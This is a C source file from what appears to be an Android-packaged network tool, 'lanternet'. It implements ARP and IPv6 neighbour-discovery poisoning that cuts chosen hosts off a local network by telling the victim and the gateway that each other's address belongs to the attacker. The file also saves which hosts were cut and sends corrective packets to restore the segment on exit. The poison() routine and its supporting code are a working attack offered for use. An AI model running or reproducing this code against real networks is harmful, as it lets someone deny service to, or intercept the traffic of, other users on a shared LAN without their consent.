/* attacks.c - the poison primitives plus state save/restore */
#include "lanternet.h"

#ifdef LANTERNET_APP
static void ndp_announce_all(void);   /* defined below */

/* The binary lives inside an APK, where there is no shell user to clean up after it, so:
  - nothing detaches
  - any signal, or the death of the app process given to --guard,
  repairs the segment before exiting
That makes an orphaned cut impossible: the worst case is a process
that notices within one tick (700 ms) and puts things back. */
volatile sig_atomic_t g_stop = 0;

static void app_on_signal(int sig){ (void)sig; g_stop = 1; }

void app_install_signals(void){
    struct sigaction sa; memset(&sa,0,sizeof sa);
    sa.sa_handler = app_on_signal;      /* just sets a flag; the loops poll it */
    sigemptyset(&sa.sa_mask);
    sigaction(SIGTERM,&sa,NULL);
    sigaction(SIGINT, &sa,NULL);
    sigaction(SIGHUP, &sa,NULL);
    signal(SIGPIPE,SIG_IGN);
}

/* the app process we belong to is gone (killed, swiped away, OOM) */
static int app_guard_dead(void){
    if(g_guard_pid<=0) return 0;
    char p[64];
    snprintf(p,sizeof p,"/proc/%d",g_guard_pid);
    return access(p,F_OK)!=0;
}

/* repair everything and leave. Called from the long-running loops only. */
void app_cleanup_exit(const char *why){
    static int busy=0;
    if(busy) _exit(0);
    busy=1;
    signal(SIGTERM,SIG_IGN); signal(SIGINT,SIG_IGN); signal(SIGHUP,SIG_IGN);
    printf("\nlanternet: %s - repairing and exiting\n", why);
    fflush(stdout);
    if(!g_gwmac[0] && !g_gwmac[1]) load_gwmac();
    if(g_gwmac[0] || g_gwmac[1]){
        for(int r=0;r<3;r++){
            garp_announce(g_gwip,g_gwmac);
            ndp_announce_all();
            usleep(150000);
        }
    }
    state_restore();
    exit(0);
}

/* called once per loop tick */
void app_guard_check(void){
    if(g_stop)              app_cleanup_exit("stopped");
    if(app_guard_dead())    app_cleanup_exit("app process is gone");
}
#endif

void poison(const struct host *h, int cut){
    static const unsigned char zero[6]={0,0,0,0,0,0};
    const unsigned char *sender = g_use_fake ? g_fake_mac : g_mymac;
    if(g_do_v4){
        if(cut){
            send_arp(1, h->mac, g_gwip, sender, h->ip, zero);    /* victim: gateway is at <sender> */
            send_arp(1, g_gwmac, h->ip, sender, g_gwip, zero);   /* gateway: victim is at <sender> */
        } else {
            send_arp(2, h->mac, g_gwip, g_gwmac, h->ip, h->mac);
            send_arp(2, g_gwmac, h->ip, h->mac, g_gwip, g_gwmac);
        }
    }
    ndp_poison(h, cut);
}

void self_keepalive(void){
    static const unsigned char zero[6]={0,0,0,0,0,0};
    if((g_gwmac[0]||g_gwmac[1]) && g_do_v4) send_arp(1, g_gwmac, g_myip, g_mymac, g_gwip, zero);
}

/* announce "ip is at mac" to the whole segment */
void garp_announce(unsigned int ip, const unsigned char *mac){
    static const unsigned char bc[6]={0xff,0xff,0xff,0xff,0xff,0xff};
    static const unsigned char zero[6]={0,0,0,0,0,0};
    if(!g_do_v4) return;
    send_arp(1, bc, ip, mac, ip, zero);
}

/* re-announce the router's real link-local to every IPv6 node */
static void ndp_announce_all(void){
    static const unsigned char allnodes[16]=
        {0xff,0x02,0,0,0,0,0,0,0,0,0,0,0,0,0,1};
    static const unsigned char dstmac[6]={0x33,0x33,0x00,0x00,0x00,0x01};
    if(!g_do_v6 || !g_v6_ok) return;
    ndp_na(dstmac, g_router_ll, allnodes, g_router_ll, g_gwmac, g_mymac);
}

/* pid recorded by a background run, 0 if there is none */
int read_pidfile(void){
    FILE *pf=fopen(PID_FILE,"r");
    if(!pf) return 0;
    int p=0;
    if(fscanf(pf,"%d",&p)!=1) p=0;
    fclose(pf);
    return p;
}

/* is a background cut still poisoning right now? */
static int poison_running(void){
    int p=read_pidfile();
    if(p>0 && kill(p,0)==0) return p;
    return 0;
}

/* undo the poison for one host, both directions, unicast and broadcast */
void fix_host(unsigned int ip, const unsigned char *mac){
    struct host h; memset(&h,0,sizeof h);
    h.ip=ip; memcpy(h.mac,mac,6);
    for(int r=0;r<5;r++){
        poison(&h,0);              /* unicast replies to victim and gateway */
        garp_announce(ip,mac);     /* "victim is at its real MAC" to everyone */
        if(g_gwmac[0]||g_gwmac[1]) garp_announce(g_gwip,g_gwmac);
        ndp_announce_all();
        usleep(150000);
    }
}

/* the restore command: put the segment back the way it was */
void restore_run(void){
    int busy=poison_running();
    if(busy) printf("warning: a background cut is still running (pid %d) - run 'stopall' first\n", busy);
    if(!(g_gwmac[0]||g_gwmac[1])) load_gwmac();
    if(g_gwmac[0]||g_gwmac[1]){
        for(int r=0;r<3;r++){
            garp_announce(g_gwip,g_gwmac);
            ndp_announce_all();
            usleep(150000);
        }
        char m[20], g[32]; struct in_addr a; a.s_addr=g_gwip;
        inet_ntop(AF_INET,&a,g,sizeof g); mac_str(g_gwmac,m);
        printf("announced gateway %s at %s\n", g, m);
    } else {
        printf("no gateway MAC known; cannot re-announce the router\n");
    }
    state_restore();
}

/* remember what we have cut so restore can repair it later */
void state_save(void){
    FILE *f=fopen(STATE_FILE,"w");
    if(!f) return;
    for(int i=0;i<g_nhost;i++){
        if(!g_hosts[i].cut) continue;
        char mac[20]; mac_str(g_hosts[i].mac,mac);
        struct in_addr a; a.s_addr=g_hosts[i].ip;
        fprintf(f,"%s %s\n", inet_ntoa(a), mac);
    }
    fclose(f);
}

/* repair every recorded cut, then clear the state */
void state_restore(void){
    FILE *f=fopen(STATE_FILE,"r");
    if(!f){ printf("no saved state (nothing was cut by this build)\n"); return; }
    char line[128]; int n=0;
    while(fgets(line,sizeof line,f)){
        char ips[32], macs[32];
        if(sscanf(line,"%31s %31s",ips,macs)!=2) continue;
        struct in_addr a; if(inet_pton(AF_INET,ips,&a)!=1) continue;
        unsigned int ip=a.s_addr;
        struct host h; memset(&h,0,sizeof h);
        h.ip=ip;
        parse_mac(macs,h.mac);
        /* corrective packets, several rounds so they stick */
        fix_host(ip, h.mac);
        printf("restored %s (%s)\n", ips, macs);
        n++;
    }
    fclose(f);
    remove(STATE_FILE);
    printf("%d host(s) released\n", n);
}
